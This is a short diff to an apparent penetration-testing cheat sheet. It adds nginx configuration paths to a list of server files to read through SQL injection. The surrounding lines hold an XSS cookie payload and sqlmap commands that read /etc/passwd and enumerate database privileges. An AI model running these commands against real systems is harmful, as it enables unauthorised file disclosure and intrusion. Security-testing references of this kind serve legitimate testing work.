@@ -514,6 +514,8 @@ javascript:alert(document.cookie)
 -->> Read Files
 sqlmap -r request --technique BESU --batch --answers="redirect=N" --ignore-redirects --level 5 --risk 3 --privileges
 sqlmap -r request --technique BESU --batch --answers="redirect=N" --ignore-redirects --level 5 --risk 3 --file-read=/etc/passwd
+/etc/nginx/sites-enabled/default.conf
+/etc/nginx/sites-enabled/default
 /etc/apache2/sites-enabled/000-default.conf
 /var/www/$DOM/index.php
 /var/www/$DOM/app.py
